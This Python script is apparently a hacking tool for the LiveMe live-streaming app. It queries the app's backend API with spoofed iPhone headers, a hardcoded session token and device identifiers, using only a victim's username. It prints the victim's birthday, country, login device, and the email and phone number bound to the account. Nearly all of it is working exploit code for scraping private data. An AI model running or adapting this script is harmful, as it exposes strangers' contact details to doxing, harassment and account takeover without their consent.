#!/usr/bin/python3
import requests as rq
from time import sleep
import sys,os,json
import requests


info_color = "\033[1;33m"
red_color = "\033[1;31m"
whiteB_color = "\033[1;37m"



print(info_color+'''

                       `-//-.           
                    ./hdddho:-          
          ``....../hmyhhyyo:++.         
        -//::-.----+ddssshs-o/`         
       .+yo:-..----omy+sohy:-           
       :/yd+---+/:/dh/+yo:.             
       :osos/-:osydyo-/+:`              
       :+- .y-     --` :/               
    ::.//   /:     /.` `+-`             
       .+:`  .-.   ``                   
                                        
   ++ The developer : Falah - 0xfff080 ++
      snapchat : flaah999

''')


user = input(whiteB_color+"username => ")






############################

print('\n-----------info------------')

headers = {'Host': 'lvapi.aaalive.com',
           'Content-Type': 'application/json; charset=utf-8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept': '*/*',
           'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
           'Connection': 'close',
           'User-Agent': 'LiveMe/4.3.55 (iPhone; iOS 13.6.1; Scale/3.00)',
           'xd': '73501b1f09dba03b9de81466240f64437ea2dcd5',
           'idfa': '130B3C79-75D1-4D96-9C31-681A33426B2E '
           }


data = ''
url = 'https://lvapi.aaalive.com/search/searchKeyword?keyword='+user+''
response = requests.request("POST", url, data=data, headers=headers)
info = json.loads(response.text)

print(whiteB_color + 'username : '+red_color +str(info["data"]["data_info"][0]["nickname"]))
print(whiteB_color + 'id user : '+red_color +str(info["data"]["data_info"][0]["short_id"]))
id = str(info["data"]["data_info"][0]["user_id"])

############################

headers = {'Host': 'lvapi.aaalive.com',
           'Content-Type': 'application/json; charset=utf-8',
           'Accept-Encoding': 'gzip, deflate, br',
           'Accept': '*/*',
           'Accept-Language': 'ar-SA;q=1, en-SA;q=0.9',
           'Connection': 'close',
           'User-Agent': 'LiveMe/4.3.55 (iPhone; iOS 13.6.1; Scale/3.00)',
           't': '1617663146834',
           'content-type':'application/x-www-form-urlencoded',
           'afid': '1617661614441-0378780',
           'd': '28bd5cac60ebc8d5c1c811df1ed9c61f23d190e9',
           'xd': '73501b1f09dba03b9de81466240f64437ea2dcd5',
           'idfa': '130B3C79-75D1-4D96-9C31-681A33426B2E'
           }


data ={'app_id':'2','area':'A_AR','netst':'1','scene_id':'personal_page_decoration','tmx_session_id':'7af7dc0f2e844d6c94c231261b2f94d2','token':'XXf0b8b490af437cf26104e667b60b2953','tongdun_black_box':'4oJq1sjb1abaI9e83UjQYV7EQWzi2q7kYqYnTar2LqZTSCjM2EzHVVRa2dFaRT7qNV3v2pRNY9ZvWUvc0WYrZDZWWanBYarPQ9ZnNV3d2V7fNbZnRcyrMXRNOFJfWEYtMWbBPTq8LCJl2oIwIcbPUoIiIdNb2UbaI9e8MTYnNpYsMpEmN9EuNDQmMTArOCIiIdBo1sZf1GVU0WrbI9etN9IiIdZb2dNf1su8O8IpL9IkNoJz','tuid':'1299248746260996097','tz':'GMT%2003%3A00','userid':id,}
url = 'https://lvapi.aaalive.com/user/getinfo'
response = requests.request("POST", url, data=data, headers=headers)
info = json.loads(response.text)

for i in range(1):
    try:


       print(whiteB_color + 'birthday : '+red_color +str(info["data"]["user"]["user_info"]["birthday"]))
       print(whiteB_color + 'countryCode : '+red_color +str(info["data"]["user"]["user_info"]["countryCode"]))
       print(whiteB_color + 'login_model : '+red_color +str(info["data"]["user"]["user_info"]["last_login_model"]))
       print(whiteB_color + 'Program version : '+red_color +str(info["data"]["user"]["user_info"]["ver"]))
       print(whiteB_color + 'nick name : '+red_color +str(info["data"]["user"]["user_info"]["nickname"]))
    except:
            print("\033[1;31msorry \033[1;m")




headers = {'Host': 'lvapi.aaalive.com',
           'Content-Type': 'application/json; charset=utf-8',
           'Accept-Encoding': 'gzip, deflate, br',
           'Accept': '*/*',
           'Accept-Language': 'ar-SA;q=1, en-SA;q=0.9',
           'Connection': 'close',
           'User-Agent': 'LiveMe/4.3.55 (iPhone; iOS 13.6.1; Scale/3.00)',
           't': '1617663146834',
           'content-type':'application/x-www-form-urlencoded',
           'afid': '1617661614441-0378780',
           'd': '28bd5cac60ebc8d5c1c811df1ed9c61f23d190e9',
           'xd': '73501b1f09dba03b9de81466240f64437ea2dcd5',
           'idfa': '130B3C79-75D1-4D96-9C31-681A33426B2E'
           }


data ={'app_id':'2','area':'A_AR','netst':'1','scene_id':'personal_page_decoration','tmx_session_id':'7af7dc0f2e844d6c94c231261b2f94d2','token':'XXf0b8b490af437cf26104e667b60b2953','tongdun_black_box':'4oJq1sjb1abaI9e83UjQYV7EQWzi2q7kYqYnTar2LqZTSCjM2EzHVVRa2dFaRT7qNV3v2pRNY9ZvWUvc0WYrZDZWWanBYarPQ9ZnNV3d2V7fNbZnRcyrMXRNOFJfWEYtMWbBPTq8LCJl2oIwIcbPUoIiIdNb2UbaI9e8MTYnNpYsMpEmN9EuNDQmMTArOCIiIdBo1sZf1GVU0WrbI9etN9IiIdZb2dNf1su8O8IpL9IkNoJz','tuid':'1299248746260996097','tz':'GMT%2003%3A00','uid':id,}
url = 'https://lvapi.aaalive.com/bind/get?vercode=4.3.55.69&rel=1&mcc=420&countryCode=SA&mnc=01&cl=ar-SA&ptvn=2&data=1&ver=4.3.55&os=iOS&cn2=appstore&api=16771040&model=iPhone10%2C6'
response = requests.request("POST", url, data=data, headers=headers)
info = json.loads(response.text)
for i in range(1):
    try:

        print('________')
        print(whiteB_color + 'email : '+red_color +str(info["data"]["bindInfo"][i]["bind_uid"]))
        print(whiteB_color + 'mobile : '+red_color +str(info["data"]["bindInfo"][i]["bind_uname"]))

    except:
            print("\033[1;31msorry \033[1;m")
            





